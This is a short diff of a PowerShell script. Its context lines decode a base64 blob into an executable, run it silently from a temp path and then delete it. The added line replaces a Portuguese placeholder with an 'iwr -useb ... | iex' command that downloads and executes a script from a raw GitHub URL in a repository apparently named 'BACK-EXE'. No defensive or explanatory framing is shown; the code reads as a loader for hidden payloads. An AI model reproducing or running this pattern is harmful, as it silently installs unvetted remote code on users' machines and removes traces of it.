@@ -7,4 +7,4 @@ $binaryData = [System.Convert]::FromBase64String($base64Data)
 Start-Process -FilePath $tempPath -NoNewWindow -Wait
 Remove-Item $tempPath -Force
 
-iwr -useb LINK DO RAW PS1 AQUI! | iex
+iwr -useb https://raw.githubusercontent.com/theuwpk/BACK-EXE/refs/heads/main/MAIN/INSTALL.TXT | iex
